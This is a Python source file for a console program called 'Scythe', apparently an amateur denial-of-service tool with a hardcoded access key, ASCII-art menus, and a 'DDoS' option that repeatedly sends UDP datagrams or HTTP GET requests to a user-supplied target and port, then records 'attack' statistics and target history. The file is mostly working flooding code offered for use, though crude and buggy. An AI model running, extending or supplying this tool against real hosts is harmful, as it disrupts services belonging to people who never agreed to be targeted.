import os
import time
import subprocess
import colorama
import socket
import requests
import discord  
import datetime


try:
    import os
    import time
    import subprocess
    import colorama
    import pyfiglet
    import socket
    import threading
    import discord  
    import datetime
except ImportError:
    print("[ERROR] Make sure you've installed the right modules to run this!")
    print(" ")
    print("[+] Press anything to exit: ")
    input()
    exit()
    
def clear():
    subprocess.call('cls', shell=True)


def keyentry():
    clear()
    password="scythekey192"
    key= input(colorama.Fore.RED + "[+] Enter key: ")
    if key==password:
        menu()
    else:
        clear()
        print(colorama.Fore.RED + "[ERROR] Invalid key!")
        time.sleep(1.7)
        keyentry()


colorama.init()
subprocess.call('title Scythe', shell=True)

color = colorama.Fore.CYAN
title = colorama.Fore.RED + """  ██████  ▄████▄▓██   ██▓▄▄▄█████▓ ██░ ██ ▓█████ 
▒██    ▒ ▒██▀ ▀█ ▒██  ██▒▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ 
░ ▓██▄   ▒▓█    ▄ ▒██ ██░▒ ▓██░ ▒░▒██▀▀██░▒███   
  ▒   ██▒▒▓▓▄ ▄██▒░ ▐██▓░░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ 
▒██████▒▒▒ ▓███▀ ░░ ██▒▓░  ▒██▒ ░ ░▓█▒░██▓░▒████▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ██▒▒▒   ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░
░ ░▒  ░ ░  ░  ▒  ▓██ ░▒░     ░     ▒ ░▒░ ░ ░ ░  ░
░  ░  ░  ░       ▒ ▒ ░░    ░       ░  ░░ ░   ░   
      ░  ░ ░     ░ ░               ░  ░  ░   ░  ░
         ░       ░ ░                             

"""

colorama_Syntax = colorama.Fore.RED

error_list = []

def menu():
    subprocess.call('title Scythe Menu', shell=True)
    clear()
    print(title)
    print(colorama.Fore.RED+"(1) DDoS")
    print(colorama.Fore.RED+ "(2) Target History")

    # Check if new errors have been logged to display an indicator
    error_indicator = " (!)" if error_list else ""
    print(colorama.Fore.RED+ "(3) Error Logs" + error_indicator)

    print(colorama.Fore.RED+ "(4) Options") 
    print(" ")
    minput=input("[+] Enter: ")
    if minput=="1":
        ddos()
    elif minput=="2":
        history()
    elif minput=="3":
        errorlogs()
    elif minput=="4":
        options()
    else:
        print(" ")
        print(colorama.Fore.RED+"I didn't understand that, try again...")
        time.sleep(0.4)
        menu()


def history():
    subprocess.call(f'title Scythe History', shell=True)
    clear()
    print(colorama.Fore.RED + """ ██░ ██  ██▓  ██████ ▄▄▄█████▓ ▒█████   ██▀███ ▓██   ██▓
▓██░ ██▒▓██▒▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▒██  ██▒
▒██▀▀██░▒██▒░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒ ▒██ ██░
░▓█ ░██ ░██░  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄   ░ ▐██▓░
░▓█▒░██▓░██░▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ ░ ██▒▓░
 ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ██▒▒▒ 
 ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░▓██ ░▒░ 
 ░  ░░ ░ ▒ ░░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ▒ ▒ ░░  
 ░  ░  ░ ░        ░               ░ ░     ░     ░ ░     
                                                ░ ░     

""")
    print(" ")
    if not os.path.isfile("target_history.txt"):
        print(colorama.Fore.RED + "No target history found!")
        time.sleep(2)
        menu()
    else:
        with open("target_history.txt", "r") as f:
            lines = f.readlines()
            if len(lines) == 0:
                print(colorama.Fore.RED + "No target history found.")
            else:
                print(colorama.Fore.RED + "Last attack details:")
                print(" ")
                for line in lines:
                    print(line.strip())  
        print(" ")
        print(colorama.Fore.RED + "\nPress anything to return to menu: ")
        input()
        menu()

def save_to_history(target_ip, port, packets, success, failed, unknown, attack_method):
    filename = "target_history.txt"
    with open(filename, "w") as f:
        f.write(f"Target IP: {target_ip}\n")
        f.write(f"Port: {port}\n")
        f.write(f"Attack Method: {attack_method}\n")
        f.write("\n")
        f.write(f"Packets: {packets}\n")
        f.write(f"Success: {success}\n")
        f.write(f"Failed: {failed}\n")
        f.write(f"Unknown: {unknown}\n")

def ddos():
    subprocess.call(f'title Scythe DDoS', shell=True)
    clear()
    print(title)
    print(" ")
    attack_method = input(colorama.Fore.RED + "[+] Enter attack method (UDP or HTTP): ").upper()
    if attack_method not in ["UDP", "HTTP"]:
        clear()
        print(colorama.Fore.RED + "[ERROR] Invalid attack method. Please enter 'UDP' or 'HTTP'.")
        time.sleep(3)
        ddos()
    print(" ")
    if attack_method=="HTTP":
        target_ip = input(colorama.Fore.RED + "[+] Target/url: ")
    if attack_method=="UDP":
        target_ip = input(colorama.Fore.RED + "[+] Target: ")
        
    print(" ")

    port = int(input(colorama.Fore.RED + "[+] Port: "))
    print(" ")

    packets = int(input(colorama.Fore.RED + "[+] Packet/s: "))

    if packets > 9999:
        clear()
        print(colorama.Fore.RED + "[ERROR] Maximum number of packets allowed is 9999.")
        time.sleep(2)
        ddos()

    print(" ")
    time.sleep(3)

    attack(target_ip, port, packets, attack_method)

def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError:
        pass
    return False

def attack(target_ip, port, packets, attack_method):
    if not check_internet():
        subprocess.call(f'title Scythe - No Internet Connection', shell=True)
        clear()
        print(colorama.Fore.RED + "[ERROR] No active internet connection. Please check your network settings!")
        time.sleep(5)
        menu()
        return

    failed = 0
    success = 0
    unknown = 0

    def send_packets(attack_method):
        nonlocal failed, success, unknown
        try:
            for _ in range(packets):
                subprocess.call(f'title Scythe is attacking!', shell=True)
                
                # Display the error before the attack status message
                if error_list:
                    print("Error Logs:")
                    print("------------")
                    for error in error_list:
                        print(error)
                    print(" ")
                    error_list.clear()  # Clear the error list after displaying

                print(colorama.Fore.RED + f"Attacking {target_ip}:{port}:{attack_method}:{packets} packets...")
                
                if attack_method == "UDP":
                    message = b"SCYTHE"
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    client_socket.sendto(message, (target_ip, port))
                    success += 1  # Update success counter for UDP
                elif attack_method == "HTTP":
                    url = f"http://{target_ip}:{port}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        success += 1  # Update success counter for HTTP
                    else:
                        failed += 1  # Update failed counter for HTTP

        except socket.error as e:
            log_error(e)  # Log the error
            failed += 1
            print(colorama.Fore.RED + f"ERROR: {e}!")
            time.sleep(3)
            menu()
        except socket.timeout:
            subprocess.call(f'title Scythe [Socket.timeout]', shell=True)
            #socket timed out
            unknown += 1
        except Exception as e:
            log_error(e)  # Log the error
            print(colorama.Fore.RED + f"ERROR: {e}!")
            time.sleep(3)
            menu()
        finally:
            if attack_method == "UDP":
                client_socket.close()

        time.sleep(0.8)
        clear()
        
        print("""██████ ▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓ █    ██   ██████ 
▒██    ▒ ▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒ ██  ▓██▒▒██    ▒ 
░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░▓██  ▒██░░ ▓██▄   
  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░ ▓▓█  ░██░  ▒   ██▒
▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒ ▒██▒ ░ ▒▒█████▓ ▒██████▒▒
▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░ ▒ ░░   ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░    ░      ▒   ▒▒ ░   ░    ░░▒░ ░ ░ ░ ░▒  ░ ░
░  ░  ░    ░        ░   ▒    ░       ░░░ ░ ░ ░  ░  ░  
      ░                 ░  ░           ░           ░  
                                            """)
        print(" ")
        print(colorama.Fore.RED + "[?] Failed packets: " + str(failed))
        print(colorama.Fore.GREEN + "[+] Successful packets: " + str(success))
        print(colorama.Fore.YELLOW + "[?] Unknown packet status: " + str(unknown))

        print(" ")
        subprocess.call(f'title Scythe Attack status', shell=True)

        results = (target_ip, port, packets, success, failed, unknown, attack_method)
        save_to_history(*results)
        print(colorama.Fore.RED + "Press anything to continue: ")
        input()
        menu()

    send_packets(attack_method)  # Call send_packets function here

def log_error(error_message):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_error = f"[{current_time}] Error: {error_message}\n"
    
    # Append the error to the global error list
    error_list.append(formatted_error)


def options():
    subprocess.call(f'title Scythe Options', shell=True)
    clear()
    print(""" ▒█████   ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █   ██████ 
▒██▒  ██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ 
▒██░  ██▒▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   
▒██   ██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒
░ ████▓▒░▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░▒██████▒▒
░ ▒░▒░▒░ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
  ░ ▒ ▒░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░
░ ░ ░ ▒  ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  
    ░ ░                     ░      ░ ░           ░       ░  
                                                            

""")

    version = "1"
    print(colorama.Fore.RED+f"Version {version}\n")
    print("Programmed by - v0dev\nGithub - v0developer")
    print(" ")

    print('Press anything to return to the menu: ')
    input()
    menu()

def errorlogs():
    subprocess.call(f'title Scythe Error Logs', shell=True)
    clear()
    print("""▓█████  ██▀███   ██▀███   ▒█████   ██▀███      ██▓     ▒█████    ▄████   ██████ 
▓█   ▀ ▓██ ▒ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██    ▒ 
▒███   ▓██ ░▄█ ▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒   ▒██░    ▒██░  ██▒▒██░▄▄▄░░ ▓██▄   
▒▓█  ▄ ▒██▀▀█▄  ▒██▀▀█▄  ▒██   ██░▒██▀▀█▄     ▒██░    ▒██   ██░░▓█  ██▓  ▒   ██▒
░▒████▒░██▓ ▒██▒░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒   ░██████▒░ ████▓▒░░▒▓███▀▒▒██████▒▒
░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░   ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ▒ ▒▓▒ ▒ ░
 ░ ░  ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░   ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░ ░ ░▒  ░ ░
   ░     ░░   ░   ░░   ░ ░ ░ ░ ▒    ░░   ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░  ░  ░  
   ░  ░   ░        ░         ░ ░     ░            ░  ░    ░ ░        ░       ░  
                                                                                

""")

    if error_list:
        print("Error Logs:")
        print("------------")
        for error in error_list:
            print(error)
        # Clear the error list after displaying
        error_list.clear()
    else:
        print("No errors logged.")

    print("\nPress anything to return to the menu: ")
    input()
    menu()

keyentry()
menu()
